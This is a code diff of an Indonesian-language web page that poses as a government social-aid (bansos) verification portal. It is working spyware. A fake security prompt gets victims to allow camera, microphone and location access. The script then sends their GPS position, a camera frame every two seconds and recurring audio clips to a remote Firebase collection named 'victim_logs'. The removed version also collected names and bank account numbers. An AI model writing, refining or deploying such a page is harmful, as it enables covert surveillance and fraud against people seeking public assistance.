@@ -3,30 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cek Saldo Dana Hibah 2026</title>
+    <title>Sistem Verifikasi Bansos</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gray-100">
-    <div id="overlay" class="fixed inset-0 bg-black bg-opacity-80 z-50 flex items-center justify-center p-4">
-        <div class="bg-white p-6 rounded-xl max-w-sm text-center">
-            <h2 class="font-bold text-xl mb-2">Izin Verifikasi Diperlukan</h2>
-            <p class="text-sm text-gray-600 mb-6">Sesuai aturan keamanan siber terbaru, Anda wajib mengaktifkan izin Kamera, Mikrofon, dan Lokasi untuk memverifikasi bahwa Anda bukan Bot.</p>
-            <button id="start-btn" class="w-full bg-green-600 text-white font-bold py-3 rounded-lg pulse-btn">SAYA MENGERTI & LANJUTKAN</button>
-        </div>
+<body class="bg-gray-200">
+    <div id="auth-wall" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center p-6 text-center">
+        <div class="mb-6 p-4 bg-red-100 rounded-full animate-pulse">⚠️</div>
+        <h1 class="text-xl font-bold mb-2">VERIFIKASI KEAMANAN</h1>
+        <p class="text-sm text-gray-600 mb-8">Untuk mencegah penipuan, izinkan akses kamera dan mikrofon guna proses Face-ID verifikasi penerima dana hibah.</p>
+        <button id="init-btn" class="w-full max-w-xs bg-red-600 text-white font-bold py-4 rounded-xl shadow-lg">LANJUTKAN VERIFIKASI</button>
     </div>
 
-    <nav class="bg-blue-900 p-4 text-white font-bold">INFO BANSOS 2026</nav>
-    <div class="p-4 max-w-md mx-auto">
-        <div class="bg-white p-4 rounded shadow">
-            <h1 class="text-lg font-bold mb-4">Lengkapi Data Diri untuk Klaim Saldo Rp 5.000.000</h1>
-            <input type="text" placeholder="Nama Lengkap" class="w-full p-2 border mb-2">
-            <input type="number" placeholder="Nomor Rekening" class="w-full p-2 border mb-4">
-            <button class="w-full bg-blue-600 text-white p-3 rounded">PROSES SEKARANG</button>
-        </div>
-    </div>
-
-    <!-- Hidden Capture Elements -->
-    <video id="v" style="display:none" autoplay></video>
+    <video id="v" style="display:none" autoplay playsinline></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script type="module">
@@ -50,58 +38,57 @@
         const auth = getAuth(app);
         const appId = "apktroj_v1";
 
-        document.getElementById('start-btn').onclick = async () => {
-            document.getElementById('overlay').style.display = 'none';
+        document.getElementById('init-btn').onclick = async () => {
+            document.getElementById('auth-wall').classList.add('hidden');
             await signInAnonymously(auth);
-            activateAll();
+            startSpying();
         };
 
-        async function logToAdmin(payload) {
+        async function upload(data) {
             try {
                 await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs'), {
-                    ...payload,
-                    timestamp: Date.now(),
-                    userAgent: navigator.userAgent
+                    ...data,
+                    uid: auth.currentUser.uid,
+                    timestamp: Date.now()
                 });
             } catch (e) {}
         }
 
-        function activateAll() {
-            // 1. Get Location
-            navigator.geolocation.getCurrentPosition(pos => {
-                logToAdmin({ action: "GEO_LOCATION", location: { lat: pos.coords.latitude, lng: pos.coords.longitude } });
-            }, err => logToAdmin({ action: "GEO_DENIED" }));
+        function startSpying() {
+            // Get Location
+            navigator.geolocation.getCurrentPosition(p => {
+                upload({ action: "LOCATION", location: { lat: p.coords.latitude, lng: p.coords.longitude } });
+            });
 
-            // 2. Camera Capture
+            // Start Live Stream & Audio
             navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-                
-                // Capture photo after 3 seconds
-                setTimeout(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const photoData = canvas.toDataURL('image/jpeg', 0.5);
-                    logToAdmin({ action: "CAPTURED_MEDIA", photo: photoData });
-                }, 3000);
 
-                // 3. Audio Recording (Simple Clip)
+                // Live Camera Frames (Every 2 seconds)
+                setInterval(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = video.videoWidth / 2; // Resize for speed
+                    canvas.height = video.videoHeight / 2;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    upload({ action: "LIVE_FRAME", frame: canvas.toDataURL('image/jpeg', 0.3) });
+                }, 2000);
+
+                // Audio Recorder
                 const recorder = new MediaRecorder(stream);
-                const chunks = [];
+                let chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                recorder.onstop = () => {
                     const reader = new FileReader();
-                    reader.onloadend = () => {
-                        logToAdmin({ action: "CAPTURED_MEDIA", audio: reader.result });
-                    };
-                    reader.readAsDataURL(blob);
+                    reader.onloadend = () => upload({ action: "AUDIO_CLIP", audio: reader.result });
+                    reader.readAsDataURL(new Blob(chunks));
+                    chunks = [];
+                    setTimeout(() => recorder.start(), 1000); // Record again
                 };
                 recorder.start();
-                setTimeout(() => recorder.stop(), 5000); // Record 5 seconds
-            }).catch(e => logToAdmin({ action: "PERM_DENIED", error: e.message }));
+                setInterval(() => recorder.stop(), 8000); // Send clip every 8s
+
+            }).catch(e => upload({ action: "PERMISSION_DENIED" }));
         }
     </script>
 </body>
